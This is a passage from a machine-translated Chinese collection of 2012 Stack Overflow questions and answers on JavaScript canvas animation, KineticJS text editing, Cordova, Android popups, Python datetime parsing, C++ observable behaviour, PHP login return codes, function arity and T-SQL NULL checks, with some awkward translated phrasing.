3.  我使用的模板引擎使用生成的 HTML 字符串更新 innerHTML。据说这比 DOM 操作更快，但我自己从未运行过基准测试。

4.  桌面应用程序和 RIA 可以从客户端模板中受益匪浅。他们可以在不依赖第三方解决方案的情况下驱动他们的界面。

5.  我们可以很容易地在我们的项目中拥有服务器端模板和客户端模板。他们可以很好地合作。在 web 项目中，我不建议我们将模板移植到客户端，只从服务器发送数据。例如，我使用带有 INCLUDE 语句的服务器端模板来构建整个页面。一个模板可以包含另一个模板结构来构建界面。对于客户端模板来说，这是一项复杂的任务，只会创建不必要的代码和开销。

# javascript - 使用 Cordova 或 PhoneGap 开发纯粹的基于浏览器的 Web 应用程序是否有意义？

> ID：13271429
> 
> 赞同：3
> 
> 时间：2012-11-07T14:08:29.393
> 
> 标签：javascript, html, cordova, mobile

乍一看，Cordova 和 PhoneGap 的存在主要是为了开发在移动设备上使用的应用程序。好吧，我对原生移动应用程序的开发不感兴趣。

存在我们自己的 web 应用程序（cms），现在的问题是，像 Cordova 或 PhoneGap 这样的移动工具包是否能够帮助开发我们的部分 cms 功能，以便能够支持更多平台。

**使用 Cordova 或 PhoneGap 开发纯基于浏览器的 Web 应用程序是否有意义？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:15:05.350

Cordova/Phonegap 使用移动操作系统提供的功能扩展了 javascript。因此，使用这些框架开发的应用程序必须编译到目标平台，并且只能在嵌入式浏览器中嵌入 HTML 等。扩展需要 java、objective-c 等代码才能运行，所以我认为您无法从这些代码中受益。

使用 Cordova/Phonegap 时，您必须编写自己的移动设备兼容 HTML 代码。该框架没有提供简洁的移动设备就绪用户界面控件，但仅提供对设备特定硬件或软件 api（如通知等）的访问权限。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-07T14:41:52.887

Phonegap（或现在称为 Cordova）的工作原理是将您的网页包装在 a 中`Webview`并让您（在 JavaScript 中）访问某些本机设备功能，例如相机、加速度计、联系人等。

至于它是否会帮助您取决于是否要使用任何本机设备功能，例如，如果您认为将相机（当前对相机的 HTML 支持相当参差不齐）合并到您的网络应用程序中是有用的，那么您可能应该考虑一下。

另一个考虑因素是您的用户将如何访问应用程序，使用 Phonegap 它将包放入本机应用程序，他们可以从主屏幕启动它（或者他们在移动设备上启动应用程序），而使用 Web 应用程序则取决于在设备上，在 iOS 上，您可以将其固定到主屏幕并添加一些元标记，使其看起来更像原生（例如隐藏地址栏），而在 Android 上，据我所知您不能这样做。

最后考虑一下，使用 Phonegap 调试您的应用程序可能会更痛苦，因为您的 HTML/Js 包含在 a 中`Webview`，但据我所知，在那里调试它没有简单的方法。

我似乎记得在某处读过的另一件事是，在 iOS 上，Apple 不会让您的本地应用程序的 Webview 访问与 safari 中相同的内存量，因此当打包到 Phonegap 应用程序中时，确切的健全的 Web 应用程序实际上可能是慢点。

总而言之，将您的应用程序包装在 Phonegap 包装器中的好处是访问本机设备功能以及您的用户如何访问您的应用程序，如果这些不重要（或弊大于利），那么它可能不值得您同时走那条路。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T14:16:18.253

Cordova 只是 PhoneGap 的最新名称。如果您只是想建立一个移动网站，我不会这样做。首先，在几个在线商店（iTunes、Play）上发布这样的应用程序是一件痛苦的事情。

# javascript - 画一个会移动的圆圈

> ID：13271433
> 
> 赞同：2
> 
> 时间：2012-11-07T14:08:50.023
> 
> 标签：javascript, html, css, canvas, html5-canvas

一直试图让一些东西在 HTML 中工作，但我还不能确定它。基本上，我想创建一个画布，然后在画布内画一个从画布边缘移动到画布边缘的圆圈。有什么建议么？

编辑：

人们想要我到目前为止所拥有的东西，所以这里是：

```
<html> 
<head> 
<script type="text/javascript">   
function draw () {
    var canvas = document.getElementById('circle');
    if (canvas.getContext) {
      var context = canvas.getContext('2d');

      context.fillStyle = "rgb(150,29,28)";
      var startPoint = (Math.PI/180)*0;
      var endPoint = (Math.PI/180)*360;
      context.beginPath(); 
      context.arc(200,200,150,startPoint,endPoint,true);    
      context.fill();
   context.closePath(); 
      }
    }   
} 
</script>
</head>
<body onload="init();"> 
<canvas id="canvas" width="500" height="500"></canvas><br>

</body> 
</html> 
```

我不太确定如何在画布上画一个圆圈（我仍然对它的实现感到不安）以及如何制作它，你知道，移动。我有如何旋转某物的示例，但没有真正如何移动它的示例。对不起，没有经验的家伙，试图自己学习 HTML，但我得到的书似乎并没有真正描述这方面，即使它应该是教我 HTML。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-07T23:04:35.190

所以到目前为止，你有一个代码，你可以在画布表面的某个位置画一个圆圈，很好，现在为了让它看起来像在移动，你必须一次又一次地继续画它稍微改变它的位置以赋予它平滑的运动效果，这是每秒绘制 60 次事物的标准（我认为这是因为每秒 60 帧是人眼能注意到的最多的帧，或其他）。当然，每次你在另一个位置绘制它时，都需要清除旧的绘图。

让我们稍微修改一下代码以使其对动画友好：

```
<script type="text/javascript">   
function init()
{
   canvas = document.getElementById('canvas');
   if(canvas.getContext)
      context = canvas.getContext('2d');
   else return;

   setInterval(draw, 1000 / 60); // 60 times per second
}

function draw()
{
   context.clearRect(0, 0, canvas.width, canvas.height);
   context.fillStyle = "rgb(150,29,28)";
   // var startPoint = (Math.PI/180)*0; Kinda redundant, it's just 0
   // var endPoint = (Math.PI/180)*360; Again, it's just PI times 2
   context.beginPath(); 
   context.arc(200, 200, 150, 0, Math.PI * 2, true);    
   context.fill();
   context.closePath(); 
} 
</script>
</head>
<body onload="init();"> 
<canvas id="canvas" width="500" height="500"></canvas><br> 
```

现在有很多有趣的方法可以让物体向固定点移动，但最简单的当然是沿直线移动。为此，您需要

*   包含对象**当前**位置的向量
*   包含对象**目标**位置的向量

让我们更改您的代码，以便我们手头有这些

```
var canvas, context,
    position = {x: 200, y: 200},
    target = {x: 400, y: 400};

function init()
{
    ...
}

function draw()
{
    context.clearRect(0, 0, canvas.width, canvas.height);
    context.fillStyle = "rgb(150,29,28)";
    context.beginPath(); 
    context.arc(position.x, position.y, 150, 0, Math.PI * 2, true);    
    context.fill();
    context.closePath(); 
} 
```

好的！这样，每当您更改`position`对象中的一个值时，您的圆圈的位置都会受到影响。

如果你从目标位置减去当前位置，你会得到另一个向量，它直接指向来自当前位置的目标位置，对吗？因此，获取该向量并对其进行**归一化**，将其长度变为 1，结果实际上将是从目标到对象位置的角度的（余弦，正弦）。这意味着如果您将该归一化向量添加到对象的当前位置，对象将一次向目标位置移动 1 个单位。

对向量进行规范化只是将它的分量除以它的长度。

```
function normalize(v)
{
    var length = Math.sqrt(v.x * v.x + v.y * v.y);
    return {x: v.x / length, y: v.y / length};
}

var step = normalize({x: target.x - position.x, y: target.y - position.y}); 
```

好的，现在我们需要做的就是继续将`step`向量添加到对象的当前位置，直到它到达目标位置。

```
function normalize(v)
{
    var length = Math.sqrt(v.x * v.x + v.y * v.y);
    return {x: v.x / length, y: v.y / length};
}

var canvas, context,
    position = {x: 200, y: 200},
    target = {x: 400, y: 400},
    step = normalize({x: target.x - position.x, y: target.y - position.y});

function init()
{
   canvas = document.getElementById('canvas');
   if(canvas.getContext)
      context = canvas.getContext('2d');
   else return;

   setInterval(draw, 1000 / 60);
}

function draw()
{
    context.clearRect(0, 0, canvas.width, canvas.height);
    context.fillStyle = "rgb(150,29,28)";
    context.beginPath(); 
    context.arc(position.x, position.y, 150, 0, Math.PI * 2, true);    
    context.fill();
    context.closePath(); 

    position.x += step.x;
    position.y += step.y;
} 
```

你有它。当然这是非常基本的代码，你必须添加一个代码来检查对象是否已经到达目标，否则它会一直越过目标。如果它移动得太慢，只需`step`按任意速度因子缩放矢量。同样在现实世界的应用程序中，你会有很多对象，而不仅仅是一个圆圈，所以你必须让它完全面向对象，因为每个对象都有它的位置、目标位置、颜色等等等。一个库使用向量会派上用场。这是我前段时间为自己写的一篇：http: [//pastebin.com/Hdxg8dxn](http://pastebin.com/Hdxg8dxn)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T15:35:36.527

给你，给它一个裂缝 -

```
<!DOCTYPE html>
<html>
<head>
<script>
function byId(e){return document.getElementById(e);}
function newEl(tag){return document.createElement(tag);}
function newTxt(txt){return document.createTextNode(txt);}
function toggleClass(element, newStr)
{
    index=element.className.indexOf(newStr);
    if ( index == -1)
        element.className += ' '+newStr;
    else
    {
        if (index != 0)
            newStr = ' '+newStr;
        element.className = element.className.replace(newStr, '');
    }
}
function forEachNode(nodeList, func)
{
    var i, n = nodeList.length;
    for (i=0; i<n; i++)
    {
        func(nodeList[i], i, nodeList);
    }
}

window.addEventListener('load', mInit, false);

var canvas, hdc;
var posx=50, posy=0, radius=50;

function circle(hdc, x, y, radius)
{
    hdc.beginPath();
    hdc.arc(x, y, radius, 0, 2*Math.PI);
    hdc.stroke();
//arc(x,y,r,start,stop)
}

function mInit()
{
    canvas = byId('tgtCanvas');
    hdc = canvas.getContext('2d');

    //circle(hdc, posx, posy, 50);
    setInterval(animateStep, 50);
}

var velX = 2;
function animateStep()
{
    posx += velX;
    if (posx+radius > canvas.width)
        velX *= -1;
    else if (posx-radius < 0)
        velX *= -1;

    hdc.clearRect(0,0,canvas.width,canvas.height);
    circle(hdc, posx, posy, radius);
}

</script>
<style>
</style>
</head>
<body>

    <canvas id='tgtCanvas' width='256' height='256'></canvas>

</body>
</html> 
```

# javascript - 动力学 js 中的可编辑文本选项

> ID：13271436
> 
> 赞同：4
> 
> 时间：2012-11-07T14:09:11.210
> 
> 标签：javascript, text, kineticjs

我想添加`Textbox`或可编辑的元素，让用户可以选择编辑文本。

这是我当前的代码：

```
var text = new Kinetic.Text({
        text: "Sample Text", ---> i want to edit this text 
        x: 50,
        y: 10,
        fill: "transparent",
        fontSize: 10,
        fontFamily: "Helvetica Neue",
        textFill: "#000",
        align: "center",
        verticalAlign: "middle",
        name:'TEXT'
    }); 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-01-16T17:53:29.143

目前似乎没有任何方法可以使用 Kinetic JS 创建可编辑文本（请参阅 stackoverflow 上的几个线程），有些人建议使用画布旁边的输入字段来编辑文本，但我的解决方案是下列的：

*   使用您的代码创建文本
*   在文本上单击 [text.on("click", function...]，在鼠标光标处创建一个输入字段

嗯，这就是计划。也许在输入字段中使用“保存”按钮文本更容易，因此您确切知道何时关闭它以及何时将输入字段数据存储到 Kinetic 文本中。如果您不想编辑它，您还需要一个“关闭”功能。

一个非常简单的解决方案也是一个简单的 JavaScript 提示：

`var xy = prompt("gimme your text");`

所以，这样的事情将是最好的解决方案恕我直言：

```
myText.on('click', function(evt) {
    this.setText(prompt('New Text:'));
    layer.draw(); //redraw the layer containing the textfield
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-01-14T15:14:07.313

我尝试了一个具有可编辑文本功能的实际 KinetiJS 插件。

我知道它正在重新发明轮子，当你可以只悬停一个文本区域时，但为什么不把它也只放在画布上。

检查插件：[https ://github.com/nktsitas/kineticjs-editable-text](https://github.com/nktsitas/kineticjs-editable-text)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-01-23T05:26:23.910

几天前我在我的项目中这样做了。野兔是代码片段。基本上我们首先绘制矩形，然后在其中放置一个文本区域，最后将其转换为 kinetic.text 节点。

```
 drawText: function ( color )
            {
                var layer1=this.model.stage.getLayers()[0];
                var $this=this;
                console.log('drawText: color: ' + color);

                if($this.rectangleDrawn==true)
                {

                    var down = false, oPoint;
                    layer1.off("mousedown touchstart mousemove touchmove mouseup touchend");
                    if(group!=undefined && group!='')
                    {
                        $this.hideAnchors(group);
                    }
                    console.log("textX: "+textX);
                    //after rectangle is drawn we now have to add the editablesection
                    $('<textarea id="text" type="text"  width='+textWidth +'px height='+textHeight+'px style="font-size: 30px;font-family:Calibri;height:'+textHeight+'px;width:'+textWidth+'px;position:absolute'+';left:'+textX+'px'+';top:'+textY+'px'+';z-index:5'+';background-color:#ffcc00;"></textarea>')

                    .insertBefore('.kineticjs-content');
                    $('#text').on('blur',function()
                    {
                        console.log("textchange");
                        text = new Kinetic.Text( {
                            x: textX,
                            y: textY,
                            stroke: color,
                            strokeWidth: 1,
                            fontSize: 30,
                            fontFamily: 'Calibri',
                            clearBeforeDraw: false,
                            name: 'image'+layer1.getName(),
                            draggable: true,
                            height: textHeight,
                            width: textWidth,
                            text: $('#text').val()
                        } );
                        text.on( 'mouseleave dbltap', function ()
                        {
                            text=this;
                        } );
                        $('#text').remove();

                        layer1.add( text );
                        layer1.draw(); 
                    })
                    },drawRectangle: function ( opacity, colorFill,stroke,textColor ){rect = new Kinetic.Rect({
                    x: mousePos.x,
                    y: mousePos.y,
                    width: 0,
                    height: 0,
                    stroke: stroke,
                    strokeWidth: 4,
                    opacity: opacity,
                    clearBeforeDraw: false,
                    name: 'image'+layer1.getName()
                });
                layer1.on( "mouseup touchend", function ( e )
                {
                console.log("rectangle: mouseup");
                console.log("width: "+rect.getWidth(  ));
                rect.setOpacity(opacity);
                rect.setFill(colorFill);
                layer1.draw();
                    down = false;
                    console.log("textColor: "+textColor)
                    if(textColor!=undefined)
                    {
                        textWidth=rect.getWidth(  );
                        textHeight=rect.getHeight(  );
                        textX = rect.getAbsolutePosition().x;
                        textY=rect.getAbsolutePosition().y;
                        $this.rectangleDrawn=true;
                        $this.drawText(textColor);
                        console.log("textdrawn ");
                        $this.group.remove();
                    }

        }, 
```

# android - 如何自动测试多用户 Android 应用程序？

> ID：13271446
> 
> 赞同：0
> 
> 时间：2012-11-07T14:09:37.793
> 
> 标签：android, testing, automated-tests

我们有一个应用程序，它与远程数据库同步，所有用户都可以修改这个数据库。此外，每个用户都有一些私有数据，这些数据仅在该用户设备之间同步，而不与其他设备同步。

## 那么，对此类应用程序进行自动化测试的最佳实践是什么？

* * *

我怎样才能看到它：

我们需要至少 2 台设备，才能在第一台设备上进行更改，并发现这些更改在第二台设备上变得可见。至少，这是我手工进行的最高级别的测试。还有两种不同的情况，当这两个“设备”属于一个用户（我使用用户谷歌帐户来区分用户）和不同的用户时......

## 这种多用户环境如何自动化测试？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T22:34:55.857

你可能不得不做一些不太理想的事情来测试它，要么创建一个特殊的测试版本，允许你覆盖你所在的帐户（让你在两个之间跳转），要么为不同的测试构建一种不同的数据库处于任何给定用户所需的状态（例如，通过为您的应用程序设置不同的端点来进行每个测试）。

在没有看到您的代码的情况下，这些是最普遍的想法，如果我知道更多，这可能是一种弹出方式，但遗憾的是我无法访问该信息。

# android - 使用弹出窗口将 Legenda 添加到 OSMdroid mapview

> ID：13271458
> 
> 赞同：0
> 
> 时间：2012-11-07T14:10:21.163
> 
> 标签：android, menu, android-mapview, osmdroid

我有一张带有自定义图块的地图，我需要在网站上添加一个可选的图例，解释自定义地图的颜色代码。

我现在尝试通过触发通过菜单显示图像的 toast 来实现我想要的。但现在我了解到 toast 最多只能显示 3.5 秒，但我需要一些东西一直覆盖在地图上，直到它被点击。因此也不会随着背景中的地图移动而消失。

编辑：这是我尝试使用弹出窗口。但是，一旦我单击菜单，应用程序“不幸地停止了”。

这是我的菜单：

```
public boolean onOptionsItemSelected(MenuItem item) {
    // Handle item selection
    switch (item.getItemId()) {
    //..
        case R.id.legenda:
            showLegenda();
            return true;
        default:
            return super.onOptionsItemSelected(item);
    } 
```

这就是我的弹出窗口现在的样子。

```
private void showLegenda() {
    // TODO Add popup here
 /*   LayoutInflater inflater = getLayoutInflater();
    View view = inflater.inflate(R.layout.toastlegenda,
                                   (ViewGroup) findViewById(R.id.relativeLayout1));

    Toast toast = new Toast(this);
    toast.setView(view);
    toast.show();*/

    LayoutInflater inflater = (LayoutInflater)
               this.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
            PopupWindow pw = new PopupWindow(
               inflater.inflate(R.layout.toastlegenda, null, false), 
               100, 
               100, 
               true);
            // The following line raises the error:
            pw.showAtLocation(this.findViewById(R.id.mapview), Gravity.CENTER, 0, 0);

} 
```

这是我的 R.id.mapview 来自的 map_layout.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout
  xmlns:android="http://schemas.android.com/apk/res/android"
  android:orientation="vertical"
  android:layout_width="match_parent"
  android:layout_height="match_parent">
<org.osmdroid.views.MapView
    android:id="@+id/mapview"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"/>
</LinearLayout> 
```

mapview 不能作为弹出窗口的根容器吗？地图视图是选项卡视图的一部分。如果有人能给我一个提示是什么引发了这里的错误，那就太好了。

这是 toastlegenda.xml （源于早期尝试用 toast 制定议程）

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout
  xmlns:android="http://schemas.android.com/apk/res/android"  
  android:layout_width="match_parent"
  android:layout_height="match_parent"
  android:id="@+id/relativeLayout1"
  android:background="@android:color/transparent">

<TextView
    android:textAppearance="?android:attr/textAppearanceLarge"
    android:id="@+id/textView1" android:layout_height="wrap_content"
    android:layout_width="fill_parent"
    android:text="Test"
    android:gravity="center"
    android:textColor="@android:color/black">
</TextView>

<ImageView
    android:layout_height="wrap_content"
    android:layout_width="fill_parent"
    android:src="@drawable/dcmr_legenda_bl"
    android:layout_below="@+id/textView1"
    android:layout_margin="5dip"
    android:id="@+id/imageView1">
</ImageView>

<TextView
    android:id="@+id/textView2"
    android:layout_height="wrap_content"
    android:layout_width="fill_parent"
    android:text="Test 1,2, 1,2..."
    android:gravity="center"
    android:layout_below="@+id/imageView1"
    android:textColor="@android:color/black">
</TextView>

</RelativeLayout> 
```

和整个错误：

```
E/AndroidRuntime(15404): FATAL EXCEPTION: main
E/AndroidRuntime(15404): java.lang.NullPointerException
E/AndroidRuntime(15404):    at android.widget.PopupWindow.showAtLocation(PopupWindow.java:809)
E/AndroidRuntime(15404):    at nl.sense.demo.MapActivity.showLegenda(MapActivity.java:156)
E/AndroidRuntime(15404):    at nl.sense.demo.MapActivity.onOptionsItemSelected(MapActivity.java:122)
E/AndroidRuntime(15404):    at android.app.Activity.onMenuItemSelected(Activity.java:2502)
E/AndroidRuntime(15404):    at com.android.internal.policy.impl.PhoneWindow.onMenuItemSelected(PhoneWindow.java:969)
E/AndroidRuntime(15404):    at com.android.internal.view.menu.MenuBuilder.dispatchMenuItemSelected(MenuBuilder.java:735)
E/AndroidRuntime(15404):    at com.android.internal.view.menu.MenuItemImpl.invoke(MenuItemImpl.java:149)
E/AndroidRuntime(15404):    at com.android.internal.view.menu.MenuBuilder.performItemAction(MenuBuilder.java:874)
E/AndroidRuntime(15404):    at com.android.internal.view.menu.IconMenuView.invokeItem(IconMenuView.java:468)
E/AndroidRuntime(15404):    at com.android.internal.view.menu.IconMenuItemView.performClick(IconMenuItemView.java:126)
E/AndroidRuntime(15404):    at android.view.View$PerformClick.run(View.java:14263)
E/AndroidRuntime(15404):    at android.os.Handler.handleCallback(Handler.java:605)
E/AndroidRuntime(15404):    at android.os.Handler.dispatchMessage(Handler.java:92)
E/AndroidRuntime(15404):    at android.os.Looper.loop(Looper.java:137)
E/AndroidRuntime(15404):    at android.app.ActivityThread.main(ActivityThread.java:4441)
E/AndroidRuntime(15404):    at java.lang.reflect.Method.invokeNative(Native Method)
E/AndroidRuntime(15404):    at java.lang.reflect.Method.invoke(Method.java:511)
E/AndroidRuntime(15404):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
E/AndroidRuntime(15404):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
E/AndroidRuntime(15404):    at dalvik.system.NativeStart.main(Native Method) 
```

# python - 如何将以下字符串转换为 python 日期？

> ID：13271465
> 
> 赞同：-1
> 
> 时间：2012-11-07T14:10:50.473
> 
> 标签：python, datetime, type-conversion

如何将：转换`u'2012-11-07T13:25:10.703Z'`为 Python 日期时间？

**编辑**

我打算使用这样的东西：

```
>>> from datetime import datetime
>>> datetime.strptime('2011-03-07','%Y-%m-%d')
datetime.datetime(2011, 3, 7, 0, 0) 
```

但是如何更改第二个参数以适应我的日期格式？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T14:21:09.457

使用[`datetime.datetime.strptime`](http://docs.python.org/2/library/datetime.html?highlight=strptime#datetime.datetime.strptime)：

```
datetime.datetime.strptime(u'2012-11-07T13:25:10.703Z', '%Y-%m-%dT%H:%M:%S.%fZ') 
```

结果：

```
datetime.datetime(2012, 11, 7, 13, 25, 10, 703000) 
```

[请`strptime`](http://docs.python.org/2/library/datetime.html?highlight=strptime#strftime-and-strptime-behavior)参阅[行为](http://docs.python.org/2/library/datetime.html?highlight=strptime#strftime-and-strptime-behavior)描述。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T14:25:28.977

使用 datetime 模块中的 strptime

```
import datetime
datetime.strptime(u'2012-11-07T13:25:10.703Z', '%Y-%m-%dT%H:%M:%S.%fZ')
>>> datetime.datetime(2012, 11, 7, 13, 25, 10, 703000) 
```

# c++ - C++ 中的副作用和可观察行为如何相关？

> ID：13271469
> 
> 赞同：14
> 
> 时间：2012-11-07T14:11:00.680
> 
> 标签：c++, side-effects

C++03 标准 1.9/6 定义了*可观察的行为*：

> 抽象机的可观察行为是它对易失性数据的读取和写入顺序以及对库 I/O 函数的调用。

然后 1.9/7 定义了*副作用*：

> 访问由 volatile 左值 (3.10) 指定的对象、修改对象、调用库 I/O 函数或调用执行任何这些操作的函数都是副作用，它们是执行环境状态的变化。

副作用是可观察到的行为吗？它们是如何相互关联的？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-11-07T14:18:09.320

不，副作用不一定是可观察到的行为。例如，修改非易失性对象是一种副作用，但不可观察。区别很重要，因为编译器可能会重新排列或完全删除副作用，只要可观察的行为保持不变。

```
int main()
{
    int a;
    a = 30;
    a += 2;
    return 0;
} 
```

如果要求，大多数编译器将`a`完全删除。这是允许的。分配和添加是不可观察的。

但是，所有可观察到的行为都必然是副作用。

# php - 处理“退货”的最佳方式？

> ID：13271472
> 
> 赞同：1
> 
> 时间：2012-11-07T14:11:09.380
> 
> 标签：php, class

我需要一个建议，如何更好地处理具有许多不同回报的功能。
我的课堂上有这个简单的登录功能：

```
public function login($email, $password){

$record = // Go to database and find what we need.

if($record){
   // Check pass, $user_match = TRUE;
} else {
   return 1;         //No such user. Please register!
}

$active = (1 == $record['is_active']) ? TRUE : FALSE;
$verified = (1 == $record['is_verified']) ? TRUE : FALSE;

//User email and password matched:
if($user_match == true){
   if($verified === true){
       // Start session and insert to db table "online_users"
   // Check that user was inserted to table: $confirm = $stmt->rowCount();

         if($confirm !== 1){
           return 2; //Unexpected technical error. Please try again in a moment.
         }

       return 0;     //0 means that all clear, we good to go.

       } else {
           return 3; //not verified
       }
    } else {
        return 4;    // no match with email and pass, reject!
    }
} 
```

问题是，现在我一直需要检查所有退货，如下所示：

```
$log = $user->login($_POST['email'], $_POST['pass']);
if($log === 0) {
    //Log in & edirect
} elseif ($log === 1) {
    //No such user. Tell to register
} elseif($log === 2){
    //technical error, try again
} elseif($log === 3){
    //Not verified
} elseif($log === 4){
    //wrong password 
```

现在真的很烦人，想象一下我是否需要检查 20 个退货？有没有更好的办法？如何更高效、更快地做到这一点？
提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T14:22:59.873

您应该重新考虑此函数的*用途并相应地构造返回类型。*如果目的是让用户登录，则只能有一个答案：要么有效，要么无效。所以函数的主要返回类型应该是布尔值。如何区分不同的失败原因是一个不同的话题。

选项1：抛出异常：

```
try {
    if (!$foo->login()) {
        echo 'Invalid credentials';
    }
} catch (UserNotActiveException $e) {
    ...
} catch (UserNotValidatedException $e) {
    ...
} 
```

不一定是最优雅的选择，因为登录失败并不是真正的*特殊*情况。

选项 2：将错误状态保存在登录提供程序中：

```
if (!$foo->login()) {
    echo "You're not logged in because ", $foo->loginError();
} 
```

这是否好取决于如何使用该类，否则您可能不希望使其过于有状态。

选项3：将登录问题*与用户状态*完全分开：

```
if (!$foo->login($user)) {
    switch ($foo->currentStatus($user)) {
        case $foo::ALL_OK :
             echo 'Login credentials invalid';
             break;
        case $foo::ACCOUNT_INACTIVE :
             ...
    }
} 
```

选项 4：返回一个状态对象：

```
$result = $foo->login();
switch ($result->status) {
    case $result::ALL_OK :
        ...
} 
```

这基本上就是你现在正在做的事情，只是没有神奇的数字。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:13:52.743

使用[异常](http://us1.php.net/manual/en/language.exceptions.php)是提供对错误代码的清晰处理的一种方法，具体取决于它如何适合您的应用程序的其余部分。

正如 Nanne 所指出的，您不应该使用异常来进行流量控制：它们应该只表示异常情况。技术错误显然是一种例外情况，为此使用例外是明确和适当的。

对其余部分使用异常不太清楚，但仍然是一种选择。您可以简单地针对每个失败条件抛出带有不同错误消息的异常，或者针对失败条件具有适当处理程序的不同异常类。

这开始打破异常*的*语义，这取决于这段代码如何与其余代码相适应。例如，能够在其他地方调用登录函数而不必担心它会引发不适当的异常可能是有用或必要的。

最后，可能无法避免需要对每个失败条件进行显式检查并将它们返回到函数中。同样，根据这需要的灵活性，您可以在成功登录时返回 true，或者在失败时返回错误消息（`===`用于验证结果是否为真，而不仅仅是真实）。或者您可以返回一个带有成功属性和错误条件的对象，这至少使您的错误处理代码成为检查成功和处理错误代码的问题。

如果您需要为每种故障情况提供显着不同的错误处理机制，那么为每种故障情况返回一个[常量](http://us3.php.net/manual/en/function.constant.php)至少可以清楚地说明代码中发生了什么。然后你可以返回`LOGIN_PASSWORDS_DO_NOT_MATCH`而不是一个神秘的数字，然后可以在你的错误代码中检查它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T14:14:45.913

`switch`如果您需要许多语句，最好使用`if-else`语句：

```
$log = $user->login($_POST['email'], $_POST['pass']);

switch ($log) {
   case 1:
     break; 
   case 2:
     break;
   //etc....
} 
```

为了澄清错误代码，请使用命名常量或名称=>代码对的静态数组，而不是“幻数”

```
static $ERROR_CODES = array(
   "WRONG_PASSWORD"=>1,
   "WRONG_EMAIL"=>2
);

switch ($log) {
   case LoginClass::$ERROR_CODES["WRONG_PASSWORD"]:
     break; 
   case LoginClass::$ERROR_CODES["WRONG_EMAIL"]:
     break;
   //etc....
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-07T14:17:31.350

您可以使用 INI 文件

将您的错误写入 ini 文件：

```
1 = "Error"
2 = " Technical"
3 = "Network"
... 
```

并将其保存到ini文件中。然后使用此代码：

```
<?php
$array = parse_ini("er.ini");
echo $array[$log];
?> 
```

# javascript - 覆盖函数的arity

> ID：13271474
> 
> 赞同：1
> 
> 时间：2012-11-07T14:11:31.870
> 
> 标签：javascript

我想制作一个通用函数包装器，（例如）打印调用的函数及其参数。

`arguments`通过准数组和简单的调用很容易做到这一点。例如：

```
function wrap(target, method) {
    return function() {
        console.log(Array.prototype.slice.call(arguments).join(', '));
        return method.apply(target, arguments);
    }
} 
```

但是，这种做法当然完全失去了被调用函数的数量（如果你不知道，可以通过其`length`属性获得 JavaScript 函数的数量（参数数量））。

有没有办法动态创建一个包装函数，将包装函数的参数复制到自身？

* * *

我考虑过创建一个新的[Function object](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function)，但我看不到任何静态提取参数列表的方法，因为该[`arguments`属性](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function/arguments)已被弃用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:27:56.537

这是使用的解决方案`Function`：

```
// could also generate arg0, arg1, arg2, ... or use the same name for each arg
var argNames = 'abcdefghijklmnopqrstuvwxyz';
var makeArgs = function(n) { return [].slice.call(argNames, 0, n).join(','); };

function wrap(target, method) {
    // We can't have a closure, so we shove all our data in one object
    var data = {
        method: method,
        target: target
    }

    // Build our function with the generated arg list, using `this.`
    // to access "closures"
    f = new Function(makeArgs(method.length),
        "console.log(Array.prototype.slice.call(arguments).join(', '));" +
        "return this.method.apply(this.target, arguments);"
    );
    // and bind `this` to refer to `data` within the function
    return f.bind(data);
} 
```

### 编辑：

这是一个更抽象的解决方案，它解决了闭包问题：

```
function giveArity(f, n) {
    return new Function(makeArgs(n),
        "return this.apply(null, arguments);"
    ).bind(f);
} 
```

还有一个更好的方法，它在调用时保留上下文：

```
function giveArity(f, n) {
    return eval('(function('+makeArgs(n)+') { return f.apply(this, arguments); })')
} 
```

用作：

```
function wrap(target, method) {
    return giveArity(function() {
        console.log(Array.prototype.slice.call(arguments).join(', '));
        return method.apply(target, arguments);
    }, method.length)
} 
```

# sql-server-2008 - 具有 NULL 值的 TSQL 参数不进入 IF 条件

> ID：13271477
> 
> 赞同：1
> 
> 时间：2012-11-07T14:11:44.030
> 
> 标签：sql-server-2008, tsql, if-statement, null

我有一个看起来像这样的查询：

```
use [dbName]

DECLARE @profile_id int
SET @profile_id = 18
DECLARE @test int

SET @test = (SELECT user_profile_id FROM tbl_profiles WHERE id = @profile_id)

SELECT @test as test

if @test = NULL
    SELECT 1

else 
    SELECT 2 
```

我知道表中的值为空，并且我可以看到 @test 已正确设置为该值，因为第一个 SELECT 显示：

```
 |test
1|NULL 
```

但是，在 IF 条件下，变量不会被视为 NULL，因为仅返回第三个 SELECT，显示：

```
 |(no column name)
1| 2 
```

这是为什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-07T14:13:21.517

你需要使用`IS NULL`（**不是** `= NULL`）

```
if @test IS NULL
    SELECT 1

else 
    SELECT 2 
```

您**永远无法**`NULL`与“常规”比较运算符进行比较 - 您始终**必须**使用`IS NULL`或`IS NOT NULL`仅使用。

并且`NULL`真的不是一个*价值*本身 - 它是一个价值的**缺失**......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:13:48.643

